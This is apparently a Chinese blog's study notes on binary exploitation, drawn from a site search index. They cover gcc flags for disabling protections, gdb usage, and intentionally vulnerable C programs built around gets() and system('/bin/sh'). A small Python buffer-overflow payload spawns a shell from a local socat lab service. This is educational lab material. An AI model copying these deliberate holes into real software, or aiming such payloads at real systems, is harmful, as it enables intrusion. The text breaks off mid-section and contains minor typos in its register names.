<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Pwnå­¦ä¹ ç¬”è®°(ä¸€)</title>
      <link href="/2024/04/16/Pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E4%B8%80)/"/>
      <url>/2024/04/16/Pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0(%E4%B8%80)/</url>
      
        <content type="html"><![CDATA[<p>å­¦ä¹ èµ„æº:<a href="https://www.bilibili.com/video/BV1mr4y1Y7fW/?spm_id_from=333.337.search-card.all.click">https://www.bilibili.com/video/BV1mr4y1Y7fW/?spm_id_from=333.337.search-card.all.click</a></p><h3 id="1-è®¤è¯†ç¨‹åº"><a href="#1-è®¤è¯†ç¨‹åº" class="headerlink" title="1.è®¤è¯†ç¨‹åº"></a>1.è®¤è¯†ç¨‹åº</h3><h4 id="1-å¸¸ç”¨ç¼–è¯‘å‘½ä»¤"><a href="#1-å¸¸ç”¨ç¼–è¯‘å‘½ä»¤" class="headerlink" title="1.å¸¸ç”¨ç¼–è¯‘å‘½ä»¤"></a>1.å¸¸ç”¨ç¼–è¯‘å‘½ä»¤</h4><p>ç¼–è¯‘ç¨‹åº</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#-o æŒ‡å®šè¾“å‡ºç¨‹åº</span><br><span class="line">gcc question.c -o question_1_x64</span><br><span class="line"></span><br><span class="line">#ç¼–è¯‘32ä½ç¨‹åº</span><br><span class="line">gcc -m32 question_1.c -o question_1_x86 </span><br><span class="line">#éœ€è¦æå‰å®‰è£…æ’ä»¶</span><br><span class="line">sudo apt-get install gcc-multilib g++-multilib module-assistant</span><br><span class="line"></span><br><span class="line">#esp</span><br><span class="line">gcc -m32 question_1.c -fno-omit-frame-pointer  -o question_1_x86_esp</span><br><span class="line">gcc question_1.c -fno-omit-frame-pointer  -o question_1_x64_esp</span><br><span class="line"></span><br><span class="line">#ç”Ÿæˆæ±‡ç¼–ä»£ç </span><br><span class="line">gcc -S question_1.c</span><br><span class="line"></span><br><span class="line">#-Oä¼˜åŒ–,ä¸€å…±ä¸‰çº§,ä¸‰çº§æœ€é«˜</span><br><span class="line">gcc question.c -O3 -o question_1_x64_O3</span><br><span class="line"></span><br><span class="line">#nopieç¼–è¯‘</span><br><span class="line">gcc question.c -no-pie -o question_1_x64_nopie</span><br><span class="line"></span><br><span class="line">#é™æ€ç¼–è¯‘,æ–‡ä»¶å¤§å°å¾ˆå¤§</span><br><span class="line">gcc question.c -static -o question_1_x64_static</span><br><span class="line"></span><br><span class="line">#å…³é—­æ ˆä¿æŠ¤</span><br><span class="line">gcc question_4_1.c -m32 -fno-stack-protector -no-pie -o question_4_1_x86</span><br><span class="line">gcc question_4_1.c  -fno-stack-protector -no-pie -fomit-frame-pointer  -o question_4_1_x64_sep</span><br></pre></td></tr></table></figure><h4 id="2-å¸¸ç”¨linuxå‘½ä»¤"><a href="#2-å¸¸ç”¨linuxå‘½ä»¤" class="headerlink" title="2.å¸¸ç”¨linuxå‘½ä»¤"></a>2.å¸¸ç”¨linuxå‘½ä»¤</h4><p>pwnä¼šç”¨åˆ°çš„å‘½ä»¤</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file å¯ä»¥çœ‹åˆ°æ–‡ä»¶çš„åŸºæœ¬ä¿¡æ¯</span><br><span class="line">readelf -a [æ–‡ä»¶å] | less å¯ä»¥çœ‹åˆ°elfæ–‡ä»¶çš„è¯¦ç»†æƒ…å†µ</span><br><span class="line"></span><br><span class="line">nm [æ–‡ä»¶å]| less æŸ¥çœ‹ç›®æ ‡æ–‡ä»¶çš„ç¬¦å·æ¸…å•</span><br><span class="line">hexdump [æ–‡ä»¶å] |less æŸ¥çœ‹16è¿›åˆ¶ç¨‹åº</span><br><span class="line"></span><br><span class="line">ldd [æ–‡ä»¶å] æŸ¥çœ‹ç”¨åˆ°çš„åº“å‡½æ•°çš„ä½ç½®</span><br><span class="line"></span><br><span class="line">checksec [æ–‡ä»¶å] æŸ¥çœ‹æ–‡ä»¶ç¼–è¯‘çŠ¶æ€</span><br><span class="line"></span><br><span class="line">objdump -d [æ–‡ä»¶å]|less å‘½ä»¤ç¼–è¯‘æˆæ±‡ç¼–æŒ‡ä»¤</span><br><span class="line">objdump -d [æ–‡ä»¶å] -M intel|less å‘½ä»¤ç¼–è¯‘æˆæ±‡ç¼–æŒ‡ä»¤</span><br><span class="line"></span><br><span class="line">#å¼€å¯socketè°ƒè¯•</span><br><span class="line">socat tcp-l:8888,fork exec:./a.out,reuseaddr</span><br></pre></td></tr></table></figure><p>æ‹¿åˆ°pwné¢˜ç¬¬ä¸€æ­¥å…ˆè¿è¡Œ,è¾“å…¥å†…å®¹çœ‹æ‰“å°ç»“æœ<br>ç¬¬äºŒéƒ¨checksecç­‰çœ‹æ–‡ä»¶å±æ€§</p><p>æŸ¥çœ‹è¿›ç¨‹çš„çœŸæ­£å†…å­˜</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.å…ˆæŸ¥è¯¢åˆ°è¿›ç¨‹çš„å¯¹åº”id,ps -ef|grep</span><br><span class="line">2.cat /proc/10144/maps</span><br></pre></td></tr></table></figure><h3 id="2-gdbè°ƒè¯•"><a href="#2-gdbè°ƒè¯•" class="headerlink" title="2.gdbè°ƒè¯•"></a>2.gdbè°ƒè¯•</h3><p>gdb:åœ°è¡¨æœ€å¼ºåŠ¨æ€è°ƒè¯•å™¨</p><h4 id="1-gdbåŸºç¡€ä½¿ç”¨"><a href="#1-gdbåŸºç¡€ä½¿ç”¨" class="headerlink" title="1.gdbåŸºç¡€ä½¿ç”¨"></a>1.gdbåŸºç¡€ä½¿ç”¨</h4><p>0.å•ä½è½¬æ¢åŸºç¡€<br>byte:å­—èŠ‚<br>1 byte &#x3D; 8 bit</p><p>1.amd64å¯„å­˜å™¨ç»“æ„<br>rax: 8Bytes<br>eax: 4Bytes<br>ax: 2Bytes<br>ah: 1Bytes<br>al: 1Bytes<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202401142120663.png" height="auto" width="75%"></p><p>rip:ç”¨æ¥å­˜æ”¾å½“å‰æ‰§è¡Œçš„æŒ‡ä»¤çš„åœ°å€<br>rbp&#x2F;rsp:ç”¨æ¥åšæ ˆ,rspå­˜æ”¾å½“å‰æ ˆé¡¶åœ°å€,rbpå­˜æ”¾å½“å‰æ ˆåº•åœ°å€<br>rax: é€šç”¨å¯„å­˜å™¨,ç”¨æ¥å­˜å‚¨ç¨‹åºè¿”å›å€¼</p><p>2.attä¸intelæ±‡ç¼–</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">move rdp,rsp  python rdp=rsp</span><br><span class="line">moveq %rsp,%rdp</span><br></pre></td></tr></table></figure><p>3.gdbåŸºç¡€ä½¿ç”¨</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gdbåŠ è½½ç¨‹åº</span><br><span class="line">gdb ./[æ–‡ä»¶å]</span><br><span class="line"></span><br><span class="line">gdbè¿è¡Œ</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">è¿è¡Œåˆ°ç¨‹åºå…¥å£ç‚¹</span><br><span class="line">start</span><br><span class="line"></span><br><span class="line">æŸ¥çœ‹å¯„å­˜å™¨</span><br><span class="line">i r</span><br><span class="line"></span><br><span class="line">åç¼–è¯‘ripæ‰€åœ¨å‡½æ•°çš„ä½ç½®</span><br><span class="line">disassemble $rip</span><br><span class="line">#att-&gt;intel</span><br><span class="line">set disassembly-flavor intel</span><br></pre></td></tr></table></figure><p>æ–­ç‚¹:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">è®¾ç½®æ–­ç‚¹</span><br><span class="line">b *0x000055555527a</span><br><span class="line"></span><br><span class="line">è®©æ–­ç‚¹å¤±æ•ˆ</span><br><span class="line">disable b [æ–­ç‚¹id]</span><br><span class="line"></span><br><span class="line">æŸ¥çœ‹æ–­ç‚¹</span><br><span class="line">i b</span><br><span class="line"></span><br><span class="line">ç»§ç»­æ‰§è¡Œ,ç›´åˆ°é‡åˆ°ä¸‹ä¸€ä¸ªæ–­ç‚¹</span><br><span class="line">c</span><br><span class="line"></span><br><span class="line">æ­¥è¿‡æŒ‡ä»¤</span><br><span class="line">ni</span><br><span class="line"></span><br><span class="line">æ­¥å…¥æŒ‡ä»¤</span><br><span class="line">si</span><br><span class="line"></span><br><span class="line">æ­¥å‡ºæŒ‡ä»¤</span><br><span class="line">finish</span><br></pre></td></tr></table></figure><p>BYTE:8ä½<br>WORD:16ä½<br>DWORD:32ä½<br>QWORD:64ä½<br>2ä¸ªåå…­è¿›åˆ¶ä½ç®—ä¸€ä¸ªå­—èŠ‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">æ‰“å°å¯„å­˜å™¨çš„å€¼</span><br><span class="line">print $rbp</span><br><span class="line"></span><br><span class="line">ä»ripå¼€å§‹å¾€ä¸‹ç¼–è¯‘20è¡Œ</span><br><span class="line">x/20i $rip</span><br><span class="line"></span><br><span class="line">é€šè¿‡Byteçš„å½¢å¼æŸ¥çœ‹</span><br><span class="line">x/20b $rbp-0x10</span><br><span class="line"></span><br><span class="line">ç»™rbp-0x10èµ‹å€¼ä¸º0x61</span><br><span class="line">p $rbp-0x10 //0x7fffffffe210</span><br><span class="line">set *0x7fffffffe210=0x61</span><br></pre></td></tr></table></figure><h4 id="2-Question1"><a href="#2-Question1" class="headerlink" title="2.Question1"></a>2.Question1</h4><p>q1.c</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> sh[]=<span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">init_func</span><span class="params">()</span>&#123;</span><br><span class="line">Â  Â  setvbuf(<span class="built_in">stdin</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">Â  Â  setvbuf(<span class="built_in">stdout</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">Â  Â  setvbuf(<span class="built_in">stderr</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">Â  Â  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">func</span><span class="params">(<span class="type">char</span> *cmd)</span>&#123;</span><br><span class="line">Â  Â  system(cmd);</span><br><span class="line">Â  Â  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">Â  Â  <span class="type">char</span> a[<span class="number">8</span>] = &#123;&#125;;</span><br><span class="line">Â  Â  <span class="type">char</span> b[<span class="number">8</span>] = &#123;&#125;;</span><br><span class="line">Â  Â  <span class="comment">//char a[1] = &#123;&#x27;b&#x27;&#125;;</span></span><br><span class="line">Â  Â  <span class="built_in">puts</span>(<span class="string">&quot;input:&quot;</span>);</span><br><span class="line">Â  Â  gets(a); Â </span><br><span class="line">Â  Â  <span class="built_in">printf</span>(a);</span><br><span class="line">Â  Â  <span class="keyword">if</span>(b[<span class="number">0</span>]==<span class="string">&#x27;a&#x27;</span>)&#123;</span><br><span class="line">Â  Â  Â  Â  func(sh);</span><br><span class="line">Â  Â  &#125;</span><br><span class="line">Â  Â  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç¼–è¯‘ä¸ºç¨‹åº(64ä½)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gcc ./q1.c -o q1</span><br></pre></td></tr></table></figure><p>gdbè°ƒè¯•</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gdb q1</span><br><span class="line">start</span><br><span class="line">disassemble $rip</span><br></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202401131004577.png" width="75%" height="auto">å¯ä»¥çœ‹å‡ºåœ¨+89æ—¶,é€šè¿‡å°†$rbp-010çš„å€¼å–8ä½ç»™eax,ä»è€Œalè·å¾—å€¼åœ¨+93å¤„å¦‚æœal=0x61åˆ™ä¸ä¼šè·³è½¬,ä»è€Œè¿è¡Œä»¥ä¸‹ç¨‹åº1.è°ƒè¯•æ”¹å€¼æ‰€ä»¥åœ¨+89å¤„è®¾ç½®æ–­ç‚¹<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b *0x00005555555552ce</span><br><span class="line">b *0x00005555555552d2</span><br></pre></td></tr></table></figure>è¿è¡Œåˆ°movzxå¤„æŸ¥çœ‹$rbp-0x10ä¸ºå…¶èµ‹å€¼0x61<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">print $rip-0x10</span><br><span class="line">set *0x7fffffffe350=0x61</span><br></pre></td></tr></table></figure>è¿è¡Œåˆ°ç¬¬äºŒä¸ªæ–­ç‚¹æ—¶,æŸ¥çœ‹å¯„å­˜å™¨çš„å€¼,å‘ç°raxä¸º0x61å³al=0x61æˆåŠŸè·å–shell<img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202401131019871.png" width="75%" height="auto"><p>2.é€šè¿‡getsæº¢å‡º<br>åœ¨è¾“å…¥æ—¶å¤šè¾“8ä¸ªå­—ç¬¦åå†è¾“å…¥1ä¸ªa<br>æ–­ç‚¹å¤„</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">print $rbp-0x10</span><br><span class="line">x/20gx 0x7fffffffe340</span><br></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202401131031564.png" width="75%" height="auto">å‘ç°$rbp-0x10å¤„ä½ä½å·²æ˜¯0x61,ç”±äºgetså‡½æ•°è¾“å…¥å†…å®¹è¿‡å¤š,å½“aè¾“å…¥æ»¡åå†…å®¹æº¢å‡ºè¦†ç›–bå†…å­˜ç›´æ¥å‘ä¸‹è¿è¡Œå³å¯è·å–shell<p>æ³¨:<br>1,æ–­ç‚¹çš„é¡ºåº:ç¨‹åºè¿è¡Œåˆ°æ–­ç‚¹å¤„ä¸ä¼šæ‰§è¡Œæ–­ç‚¹è¯­å¥,ç»§ç»­æ‰§è¡Œæ‰ä¼šæ‰§è¡Œæ–­ç‚¹è¯­å¥<br>2.x&#x2F;20bå°ç«¯,x&#x2F;20gxå¤§ç«¯<br>é€‰bx<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202401142149302.png" width="75%" height="auto"><br>é€‰gx<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202401142148157.png" width="75%" height="auto"><br>gxåˆ†ä¸¤åˆ—,ç¬¬ä¸€åˆ—å°ç¬¬äºŒåˆ—å¤§,æ¯åˆ—ä¸­å·¦é«˜ä½å³ä½ä½<br>bxæ˜¯ä»ä½ä½åˆ°é«˜ä½ï¼Œå·¦ä½ä½å³é«˜ä½</p><h4 id="3-Question1-x86"><a href="#3-Question1-x86" class="headerlink" title="3.Question1_x86"></a>3.Question1_x86</h4><p>gbbçš„x86è°ƒè¯•</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gcc -m32 q1.c -o q1_x86</span><br></pre></td></tr></table></figure><p>-m32å¦‚æœä¸è¡Œ,å»å®‰è£…æ’ä»¶</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt-get install gcc-multilib g++-multilib module-assistant</span><br></pre></td></tr></table></figure><p>gdbè°ƒè¯•</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">start</span><br><span class="line">disassemble $eip  //32ä½æ˜¯eip</span><br></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202401142156479.png" width="75%" height="auto">åœ¨+120å¤„ç»™eaxå¤åˆ¶ï¼Œ124æ¯”è¾ƒalå’Œ0x61å¹¶å°†ç»“æœç»™126æ¡ä»¶åˆ¤æ–­<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">åœ¨+120å¤„æ‰“æ–­ç‚¹</span><br><span class="line">b *0x56556379</span><br><span class="line"></span><br><span class="line">è¿è¡Œåˆ°æ–­ç‚¹å¤„æŸ¥çœ‹$ebp-0x10</span><br><span class="line">å‘ç°å­˜å‚¨åœ°å€0xffffd4c4ï¼Œå°†è¯¥å€¼èµ‹å€¼ä¸º0x61</span><br><span class="line">(gdb) set *0xffffd4c4=0x61</span><br></pre></td></tr></table></figure><p>æœ‰æ—¶ç”¨SETéœ€è½¬æ¢ä¸ºUnsignedç±»å‹</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set *((unsigned int)$ebp+0x10)=0x18</span><br></pre></td></tr></table></figure><h3 id="3-åˆè¯†pie-static-å¯»å€æ–¹å¼"><a href="#3-åˆè¯†pie-static-å¯»å€æ–¹å¼" class="headerlink" title="3.åˆè¯†pie_static_å¯»å€æ–¹å¼"></a>3.åˆè¯†pie_static_å¯»å€æ–¹å¼</h3><h4 id="1-pieä¸static"><a href="#1-pieä¸static" class="headerlink" title="1.pieä¸static"></a>1.pieä¸static</h4><p>1.nopieç¼–è¯‘</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-no-pie</span><br><span class="line">æ•°å­—å°±æ˜¯40å¼€å¤´è‡³å°‘å…­ä½</span><br><span class="line"></span><br><span class="line">æ­£å¸¸ç¼–è¯‘</span><br><span class="line">æ•°å­—å°±å¾ˆå°,ä¸€èˆ¬å››ä½äº”ä½</span><br></pre></td></tr></table></figure><p>2.staticç¼–è¯‘çš„æ–‡ä»¶ æ–‡ä»¶å¤§å°å¾ˆå¤§</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-static</span><br><span class="line">file æ–‡ä»¶å±æ€§ä¸­ä¸ºstatically linked</span><br><span class="line">ldd ä¸æ˜¯åŠ¨æ€å¯æ‰§è¡Œæ–‡ä»¶</span><br></pre></td></tr></table></figure><p>3.-Oä¼˜åŒ–,ä¸€å…±ä¸‰çº§,ä¸‰çº§æœ€é«˜<br>gcc question.c -O3 -o question_1_x64_O3<br>å½“gccè®¤ä¸ºæœ‰å‡½æ•°ä¸ä¼šæ‰§è¡Œåä¼šè¿›è¡Œä¼˜åŒ–</p><h4 id="2-Question2-strcmp"><a href="#2-Question2-strcmp" class="headerlink" title="2.Question2(strcmp)"></a>2.Question2(strcmp)</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> sh[]=<span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line">  </span><br><span class="line"><span class="type">int</span> <span class="title function_">init_func</span><span class="params">()</span>&#123;</span><br><span class="line">Â  Â  setvbuf(<span class="built_in">stdin</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">Â  Â  setvbuf(<span class="built_in">stdout</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">Â  Â  setvbuf(<span class="built_in">stderr</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">Â  Â  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">func</span><span class="params">(<span class="type">char</span> *cmd)</span>&#123;</span><br><span class="line">Â  Â  system(cmd);</span><br><span class="line">Â  Â  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">  </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">Â  Â  init_func();</span><br><span class="line">Â  Â  <span class="type">char</span> a[<span class="number">8</span>] = &#123;&#125;;</span><br><span class="line">Â  Â  <span class="type">char</span> b[<span class="number">8</span>] = &#123;&#125;;</span><br><span class="line">Â  Â  <span class="built_in">puts</span>(<span class="string">&quot;input:&quot;</span>);</span><br><span class="line">Â  Â  gets(a); Â </span><br><span class="line">Â  Â  <span class="built_in">printf</span>(a);</span><br><span class="line">Â  Â  <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(b,<span class="string">&quot;deadbeef&quot;</span>))&#123;</span><br><span class="line">Â  Â  Â  Â  func(sh);</span><br><span class="line">Â  Â  &#125;</span><br><span class="line">Â  Â  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>gdbè°ƒè¯•</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gcc q2.c -o q2</span><br></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202401142232849.png" width="75%" height="auto">jneè·³è½¬æ¡ä»¶é€šè¿‡testå¾—åˆ°test eax,eax : eax&eax   =>cmp eax,0ç­‰äº0ä¸è·³è½¬,ä¸ç­‰äº0è·³è½¬ç¬¬äºŒç« ä¼šç³»ç»Ÿå­¦ç¨‹åºè¿‡ç¨‹ç¬¬ä¸€ç« åªè¦æŒæ¡gdbè°ƒè¯•å³å¯å‰8ä½éšä¾¿è¾“,ç¬¬ä¹ä½å¼€å§‹è¾“å…¥deadbeefå³å¯è·å–shell<h3 id="4-pythonè„šæœ¬æ‰“pwn"><a href="#4-pythonè„šæœ¬æ‰“pwn" class="headerlink" title="4.pythonè„šæœ¬æ‰“pwn"></a>4.pythonè„šæœ¬æ‰“pwn</h3><h4 id="pythonè„šæœ¬æ‰“pwnåˆè¯†"><a href="#pythonè„šæœ¬æ‰“pwnåˆè¯†" class="headerlink" title="pythonè„šæœ¬æ‰“pwnåˆè¯†"></a>pythonè„šæœ¬æ‰“pwnåˆè¯†</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> sh[]=<span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">init_func</span><span class="params">()</span>&#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stderr</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">func</span><span class="params">(<span class="type">char</span> *cmd)</span>&#123;</span><br><span class="line">system(cmd);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> a[<span class="number">8</span>] = &#123;&#125;;</span><br><span class="line">    <span class="type">char</span> b[<span class="number">8</span>] = &#123;&#125;;</span><br><span class="line">    <span class="comment">//char a[1] = &#123;&#x27;b&#x27;&#125;;</span></span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;input:&quot;</span>);</span><br><span class="line">gets(a);  </span><br><span class="line"><span class="built_in">printf</span>(a);</span><br><span class="line"><span class="keyword">if</span>(b[<span class="number">0</span>]==<span class="number">0x10</span>)&#123; </span><br><span class="line">func(sh);</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>1.gdbè°ƒè¯•<br>ä½¿ç”¨setä½¿å¾—$rbp-0x10ä¸º0x10å–å¾—shell<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202401142251946.png" width="75%" height="auto"><br>2.å€ŸåŠ©pythonè„šæœ¬å®ç°<br>é¢˜ç›®ä½¿ç”¨socatå¼€å¯socketæœåŠ¡,ipåœ°å€ä¸º192.168.110.135</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">socat tcp-l:8877,fork exec:./q3,reuseaddr</span><br></pre></td></tr></table></figure><p>æœ¬æœº</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> telnetlib</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">Â  Â  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">Â  Â  s.connect((<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">8877</span>))</span><br><span class="line">Â  Â  payload = <span class="string">&#x27;A&#x27;</span>*<span class="number">8</span> + <span class="string">&#x27;\x10&#x27;</span></span><br><span class="line">Â  Â  s.sendall(payload + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">Â  Â  t = telnetlib.Telnet()</span><br><span class="line">Â  Â  t.sock = s</span><br><span class="line">Â  Â  t.interact()</span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">Â  Â  pwn()</span><br></pre></td></tr></table></figure><p>é€šè¿‡python2è¿è¡Œ,æˆåŠŸè·å–shell<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202401142304285.png" width="75%" height="auto"></p><h4 id="Question3-fp"><a href="#Question3-fp" class="headerlink" title="Question3(fp)"></a>Question3(fp)</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">char</span> sh[]=<span class="string">&quot;/bin/sh&quot;</span>;</span><br><span class="line">  </span><br><span class="line"><span class="type">int</span> <span class="title function_">init_func</span><span class="params">()</span>&#123;</span><br><span class="line">Â  Â  setvbuf(<span class="built_in">stdin</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">Â  Â  setvbuf(<span class="built_in">stdout</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">Â  Â  setvbuf(<span class="built_in">stderr</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">0</span>);</span><br><span class="line">Â  Â  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">func</span><span class="params">(<span class="type">char</span> *cmd)</span>&#123;</span><br><span class="line">Â  Â  system(sh);</span><br><span class="line">Â  Â  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">Â  Â  init_func();</span><br><span class="line">Â  Â  <span class="keyword">volatile</span> <span class="title function_">int</span> <span class="params">(*fp)</span><span class="params">()</span>;</span><br><span class="line">Â  Â  fp=<span class="number">0</span>;</span><br><span class="line">Â  Â  <span class="type">int</span> a;</span><br><span class="line">Â  Â  <span class="comment">//char a[4] = &#123;&#125;;</span></span><br><span class="line">Â  Â  <span class="comment">//char b[0x10] = &#123;&#125;;</span></span><br><span class="line">Â  Â  <span class="built_in">puts</span>(<span class="string">&quot;input:&quot;</span>);</span><br><span class="line">Â  Â  gets(&amp;a); Â </span><br><span class="line">Â  Â  <span class="comment">//printf(&amp;a);</span></span><br><span class="line">Â  Â  <span class="keyword">if</span>(fp)&#123;</span><br><span class="line">Â  Â  fp();</span><br><span class="line">Â  Â  &#125;</span><br><span class="line">Â  Â  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>1.gdbæ‰‹å·¥è°ƒè¯•</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gcc ./q3.c -o q3</span><br></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202401152200292.png" width="75%" height="auto">åœ¨+90å¤„ä¼šç”¨callå›è°ƒrdx,å¦‚æœå°†rdxçš„å€¼è®¾ä¸ºfuncå‡½æ•°çš„åœ°å€,å³å¯è·å–shell<p>æŸ¥çœ‹funcå‡½æ•°çš„åœ°å€</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">p 